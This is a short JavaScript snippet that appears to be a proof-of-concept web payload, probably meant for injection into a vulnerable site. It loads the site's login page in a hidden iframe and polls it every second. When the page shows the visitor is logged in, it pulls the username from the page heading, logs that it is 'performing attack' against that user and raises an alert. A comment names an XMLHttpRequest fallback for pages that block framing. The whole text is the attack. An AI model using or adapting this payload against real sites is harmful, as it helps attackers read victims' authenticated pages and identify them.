frame = document.createElement("iframe");
                    
function test_auth() {
    console.log("Checking auth state...");
    title = frame.contentDocument.getElementsByTagName("h1")[0].children[0].innerText;
    var is_auth = title != "Login";

    if(is_auth) {
        name = title.split(" ")[2];
        clearInterval(auth_checker);
        console.log("Performing attack against user: " + name + "!");
        alert("Hello, " + name);
    }

    frame.src += ""; // trick to force iframes to reload
}

// Assuming X-Frame-Options isn't DENY
// If this is the case, we would use XMLHttpRequests and read the page contents
frame.src = "login";
frame.style = "display: none";
document.body.append(frame);

auth_checker = setInterval(function() {test_auth()}, 1000);